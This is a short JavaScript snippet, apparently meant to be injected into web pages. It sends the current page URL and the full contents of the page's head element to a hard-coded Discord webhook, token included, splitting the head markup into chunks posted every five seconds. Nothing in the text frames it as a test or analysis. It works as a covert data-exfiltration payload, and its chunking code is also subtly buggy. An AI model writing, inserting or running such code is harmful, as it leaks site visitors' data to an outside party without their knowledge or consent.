var xhr = new XMLHttpRequest();var url = "https://discord.com/api/webhooks/1230013392190836807/YBJ3pNOa544labFi-TcurRFMDKlM2LMT36Jiel1PFWAy8TDWQqUa-yolhXwHQYD-F8bh";xhr.open("POST", url, true);xhr.setRequestHeader("Content-Type", "application/json");var data = JSON.stringify({"content": window.location.href});xhr.send(data);

function wait(ms){
   var start = new Date().getTime();
   var end = start;
   while(end < start + ms) {
     end = new Date().getTime();
  }
}
function sendMessage(message) {
    const webhookUrl = "https://discord.com/api/webhooks/1230013392190836807/YBJ3pNOa544labFi-TcurRFMDKlM2LMT36Jiel1PFWAy8TDWQqUa-yolhXwHQYD-F8bh";

    for (let i = 0; i < Math.round(message.length / 256); i++) {
        const request = new XMLHttpRequest();
        request.open("POST", webhookUrl);
        request.setRequestHeader("Content-type", "application/json");

        const messageData = {
            content: message.substr(i*256, i*256+256),
            username: "My Webhook From Library Monday",
            avatar_url: "https://example.com/avatar.png"
        };

        request.send(JSON.stringify(messageData));
        wait(5000);
    }
}

const all_elements = document.head.innerHTML
sendMessage(all_elements);
